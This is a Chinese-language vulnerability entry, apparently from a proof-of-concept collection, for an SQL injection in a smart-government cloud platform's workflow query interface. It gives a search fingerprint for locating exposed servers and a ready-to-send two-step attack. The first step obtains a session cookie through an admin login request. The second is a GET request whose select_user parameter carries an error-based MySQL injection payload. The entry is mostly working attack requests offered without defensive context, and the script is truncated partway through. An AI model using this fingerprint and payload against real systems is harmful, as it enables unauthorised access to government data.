# 数字通云平台智慧政务系统index接口存在Sql注入漏洞

- **系统**：数字通云平台智慧政务系统index接口　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="assets/2efc01da"`
- **请求**：`POST /portal/default/login HTTP/1.1`

**请求体 / payload**
```
在响应头获取set-cookie字段
Host:
Cookie: GOASESSID=teee69jht7234nr1ei5uuutiu7
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
userID=admin&flag=rone
将获取到的cookie字段传入下面请求头
GET /workflow/query/index?WfRtApplication%5Brun_id%5D=&WfRtApplication%5Bsearch_name%5D=&WfRtApplication%5Bworkflow_name%5D=&WfRtApplication%5Bdate%5D=&WfRtApplication%5Bselect_type%5D=all&WfRtApplication%5Bselect_user%5D=1%20AND%20(SELECT%202*(IF((SELECT%20*%20FROM%20(SELECT%20CONCAT(0x7e,(SELECT%20md5(123456)),0x7e,0x78))s),%208446744073709551610,%208446744073709551610)))&ajax=process-grid HTTP/1.1
Host:
Cookie: G…（脚本共 1954 字，完整版见原文）
```
- **预期**：302　|　—